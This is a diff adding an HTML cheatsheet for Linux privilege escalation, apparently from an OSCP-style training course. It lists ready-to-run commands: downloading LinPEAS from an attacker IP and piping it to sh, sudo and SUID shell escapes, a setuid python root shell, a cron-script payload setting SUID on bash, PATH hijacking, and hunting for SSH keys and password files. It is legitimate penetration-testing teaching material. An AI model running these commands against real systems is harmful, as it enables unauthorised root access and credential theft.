@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reference · Linux Privilege Escalation Cheatsheet</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="./links.html">Links</a> · Reference · <strong>Linux Privesc</strong> · <a href="./glossary.html">Glossary</a> · <a href="./web-exploitation.html">Web Exploitation</a></nav>
+
+<span class="kicker">Reference · Low-priv shell → root</span>
+<h1>Linux Privilege Escalation Cheatsheet</h1>
+<p class="lead">Commands for <a href="../lessons/0006-linux-privilege-escalation.html">Lesson 06</a>. Run top-to-bottom on any low-priv shell. The reflex: <strong>safe vectors first, kernel exploit last.</strong> Look up any sudo/SUID binary on <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>
+
+<h2>Situational awareness</h2>
+<pre><span class="p">$</span> <span class="o">sudo -l</span>                 <span class="c"># what can I run as root? (check FIRST)</span>
+<span class="p">$</span> <span class="o">id; whoami; groups</span>     <span class="c"># lxd/docker/disk groups = a path</span>
+<span class="p">$</span> <span class="o">uname -a; cat /etc/os-release</span>   <span class="c"># kernel + distro</span>
+<span class="p">$</span> <span class="o">cat /etc/passwd | grep sh$</span>   <span class="c"># real users to target</span>
+<span class="p">$</span> <span class="o">ls -la /home/*; cat ~/.bash_history</span></pre>
+
+<h2>Automated sweep</h2>
+<pre><span class="c"># transfer LinPEAS: on YOUR box serve it, on the target pull + run</span>
+<span class="p">$</span> <span class="o">python3 -m http.server 80</span>      <span class="c"># attacker, in the linpeas dir</span>
+<span class="p">$</span> <span class="o">curl 10.10.14.5/linpeas.sh | sh</span>  <span class="c"># target (read the RED/YELLOW hits)</span></pre>
+
+<h2>sudo rights</h2>
+<pre><span class="p">$</span> <span class="o">sudo -l</span>
+<span class="c"># allowed a binary? check GTFOBins, e.g.:</span>
+<span class="p">$</span> <span class="o">sudo find . -exec /bin/sh \; -quit</span>
+<span class="p">$</span> <span class="o">sudo vim -c ':!/bin/sh'</span>
+<span class="c"># LD_PRELOAD / env_keep set? abuse it per GTFOBins</span></pre>
+
+<h2>SUID / SGID binaries</h2>
+<pre><span class="p">$</span> <span class="o">find / -perm -4000 -type f 2>/dev/null</span>   <span class="c"># SUID</span>
+<span class="p">$</span> <span class="o">find / -perm -2000 -type f 2>/dev/null</span>   <span class="c"># SGID</span>
+<span class="c"># take any non-standard result to GTFOBins for the exploit</span></pre>
+
+<h2>Capabilities</h2>
+<pre><span class="p">$</span> <span class="o">getcap -r / 2>/dev/null</span>
+<span class="c"># e.g. cap_setuid on python:</span>
+<span class="p">$</span> <span class="o">./python -c 'import os;os.setuid(0);os.system("/bin/sh")'</span></pre>
+
+<h2>Cron jobs</h2>
+<pre><span class="p">$</span> <span class="o">cat /etc/crontab; ls -la /etc/cron.*</span>
+<span class="p">$</span> <span class="o">grep -R "CRON" /var/log 2>/dev/null</span>
+<span class="c"># script writable + run by root? append a payload:</span>
+<span class="p">$</span> <span class="o">echo 'chmod +s /bin/bash' >> /path/to/root_cron.sh</span>
+<span class="p">$</span> <span class="o">/bin/bash -p</span>   <span class="c"># after it runs</span></pre>
+
+<h2>Writable files &amp; PATH hijack</h2>
+<pre><span class="p">$</span> <span class="o">find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)'</span>
+<span class="p">$</span> <span class="o">ls -l /etc/passwd</span>   <span class="c"># writable? add a root user with a known hash</span>
+<span class="c"># root script calls a relative binary (e.g. 'service')? hijack PATH:</span>
+<span class="p">$</span> <span class="o">echo '/bin/bash' > /tmp/service; chmod +x /tmp/service; export PATH=/tmp:$PATH</span></pre>
+
+<h2>Hunt for credentials</h2>
+<pre><span class="p">$</span> <span class="o">grep -rin "password" /var/www /etc /home 2>/dev/null</span>
+<span class="p">$</span> <span class="o">cat ~/.ssh/id_rsa; find / -name "id_rsa" 2>/dev/null</span>
+<span class="p">$</span> <span class="o">cat *.conf .env wp-config.php 2>/dev/null</span>
+<span class="c"># reuse everything: su &lt;user&gt;, ssh -i id_rsa, sudo -l as them</span></pre>
+
+<h2>Kernel exploit — last resort</h2>
+<pre><span class="p">$</span> <span class="o">uname -a</span>
+<span class="p">$</span> <span class="o">searchsploit linux kernel 4.4</span>   <span class="c"># match version carefully; may crash the box</span></pre>
+
+<div class="box warn">
+<span class="box-title">Always grab proof</span>
+After rooting: <code>id</code> to confirm <code>uid=0</code>, then <code>cat /root/proof.txt</code> (and the earlier <code>local.txt</code>). No proof file in the report = no points.
+</div>
+
+<footer>
+<span><a href="../lessons/0006-linux-privilege-escalation.html">← Lesson 06: Linux Privilege Escalation</a></span>
+<span><a href="./glossary.html">Glossary</a> · <a href="./web-exploitation.html">Web Exploitation</a></span>
+</footer>
+
+</body>
+</html>
